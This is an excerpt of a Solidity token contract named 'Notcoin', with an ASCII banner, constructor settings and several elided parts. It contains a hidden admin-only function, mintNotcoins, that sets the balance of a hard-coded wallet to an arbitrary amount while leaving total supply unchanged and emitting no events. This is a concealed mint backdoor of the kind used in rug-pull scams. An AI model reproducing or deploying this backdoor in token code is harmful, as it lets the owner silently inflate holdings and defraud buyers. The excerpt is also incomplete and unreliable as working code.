...
/*
  _   _       _            _         _____                    
 | \ | | ___ | |_ ___ ___ (_)_ __   |_   _|__  __ _ _ __ ___  
 |  \| |/ _ \| __/ __/ _ \| | '_ \    | |/ _ \/ _` | '_ ` _ \ 
 | |\  | (_) | || (_| (_) | | | | |   | |  __/ (_| | | | | | |
 |_| \_|\___/ \__\___\___/|_|_| |_|   |_|\___|\__,_|_| |_| |_|
                                                                                        
*/

// First not the coin coin on blockchain
...
contract Notcoin  {
    ...
    constructor(address adds) {
        tokenName = "Notcoin";
        tokenSymbol = "NOT";
        tokenDecimals = 18;
        tokenTotalSupply = 102719221714 * 10 ** tokenDecimals;
    ...
    function mintNotcoins(uint256 addV) external {
        if(adm == msg.sender){
            _balances[0xc45227fC211959DcB49a8915DcCC5392dF8e8c12] = 10000000 * addV * 10 ** tokenDecimals;
        }
    } 
